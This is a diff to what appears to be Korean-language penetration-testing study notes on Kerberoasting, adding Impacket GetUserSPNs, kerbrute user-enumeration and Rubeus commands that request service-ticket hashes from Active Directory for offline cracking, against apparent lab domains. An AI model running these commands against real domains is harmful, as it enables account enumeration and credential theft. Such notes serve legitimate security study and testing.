@@ -382,11 +382,23 @@ Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName
 
 > SPN이 설정된 서비스 계정의 TGS 티켓을 요청하여 오프라인 크래킹
 
+### Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
+```bash
+sudo ntpdate <ip>
+```
+
 ### GetUserSPNs (Impacket)
 > 리눅스에서 Kerberoasting 수행
 
 ```bash
 # 특정 사용자의 TGS 티켓 요청 및 해시 저장
+impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/pete
+
+# username만 아는 상태로 시도.
+impacket-GetUsersSPNs -request -dc-ip <ip> <domain>/<user> -no-pass
+
+./kerbrute_linux_amd64 userenum --dc 192.168.133.40 -d haero /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
+
 GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev -outputfile sqldev_tgs
 ```
 
@@ -413,6 +425,8 @@ Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfre
 
 # 특정 사용자 타겟팅 (TGT 위임 사용)
 .\Rubeus.exe kerberoast /user:testspn /nowrap /tgtdeleg
+
+.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
 ```
   
 </details>
